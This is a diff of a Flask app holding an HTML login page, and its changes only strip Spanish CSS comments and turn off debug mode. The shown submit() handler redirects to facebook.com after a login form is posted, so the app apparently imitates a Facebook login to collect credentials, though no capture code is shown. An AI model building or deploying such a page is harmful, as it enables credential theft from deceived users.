@@ -33,8 +33,8 @@ login_page = """
             margin-bottom: 20px;
         }
         .logo img {
-            width: 70%;  /* Hacemos la imagen más responsiva */
-            max-width: 250px;  /* Limite máximo de tamaño para pantallas grandes */
+            width: 70%;
+            max-width: 250px;
             height: auto;
         }
         .form-group {
@@ -77,7 +77,6 @@ login_page = """
             color: gray;
         }
 
-        /* Estilo adicional para pantallas más pequeñas */
         @media (max-width: 600px) {
             .container {
                 width: 90%;
@@ -132,4 +131,4 @@ def submit():
     return redirect("https://www.facebook.com/")
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run()
